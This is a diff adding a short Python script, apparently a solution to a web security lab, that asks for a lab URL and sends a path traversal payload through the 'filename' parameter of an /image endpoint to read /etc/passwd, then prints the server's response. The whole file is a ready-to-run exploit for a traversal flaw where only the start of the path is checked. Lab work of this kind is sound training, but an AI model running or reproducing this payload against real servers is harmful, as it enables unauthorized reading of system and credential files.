@@ -1,0 +1,25 @@
+import requests
+session = requests.session()
+
+base_url = input(f"Enter the lab URL: ").strip().rstrip("/")
+target_url =(f"{base_url}/image")
+
+
+payload = {
+    'filename': "/var/www/images/../../../etc/passwd"
+}
+
+print(f"Sending payload to: {target_url}")
+try:
+    response = session.get(target_url, params=payload, timeout=10)
+except requests.RequestException as e:
+    print(f"[*] Payload execution failed: {e}")
+    exit(1)
+
+if response.status_code == 200:
+    print(f"Payload executed successfully: {response.status_code}")
+    print(f"[*] Output:\n {response.text.strip()}")
+else:
+    print(f"[*] Error occured: {response.status_code}")
+
+print("[*] Successfully handled validation of start of path...")
